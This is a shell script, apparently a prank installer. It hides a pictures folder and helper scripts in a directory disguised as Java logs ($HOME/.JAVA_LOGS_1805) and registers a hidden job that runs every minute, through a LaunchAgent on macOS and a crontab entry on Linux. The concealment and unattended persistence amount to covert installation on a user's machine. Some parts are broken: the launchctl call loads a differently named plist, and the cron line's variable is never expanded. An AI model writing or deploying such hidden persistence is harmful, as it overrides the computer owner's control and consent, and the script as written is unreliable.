
# check operative system
if [[ "$OSTYPE" == "darwin"* ]]; then
    OS="MAC"
elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
    OS=$(sh linux-environments.sh -n)
    # TODO: missing jobs for environments
fi

# set vars
ROOT_FOLDER=$HOME/.JAVA_LOGS_1805

# hide pictures
rm -rf $ROOT_FOLDER
cp -r pictures $ROOT_FOLDER

# hide job and randomizer
cp randomizer.sh $ROOT_FOLDER/.randomizer.sh
cp jobs/$OS.sh $ROOT_FOLDER/.job.sh

# give perms to job and randomizer
chmod +x $ROOT_FOLDER/.randomizer.sh
chmod +x $ROOT_FOLDER/.job.sh


# setup cronjob
if [[ "$OS" == "MAC" ]]; then # MAC CASE

    PLIST_NAME=com.zac.efron.plist
    echo '
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
      <key>Label</key>
      <string>com.zac.efron</string>
      <key>ProgramArguments</key>
      <array>
        <string>${ROOT_FOLDER}/.job.sh</string>
      </array>
      <key>Nice</key>
      <integer>1</integer>
      <key>StartInterval</key>
      <integer>60</integer>
      <key>RunAtLoad</key>
      <true/>
      <key>StandardErrorPath</key>
      <string>${ROOT_FOLDER}/.logs</string>
      <key>StandardOutPath</key>
      <string>${ROOT_FOLDER}/.logs</string>
    </dict>
    </plist>
    ' > $HOME/Library/LaunchAgents/$PLIST_NAME
    launchctl load com.alvin.crontabtest.plist

else # LINUX CASE

    (crontab -l -u $USER 2>/dev/null; \
    echo '* * * * * ${ROOT_FOLDER}/.job.sh ${ROOT_FOLDER} > ${ROOT_FOLDER}/.logs 2>&1') \
    | crontab -

fi
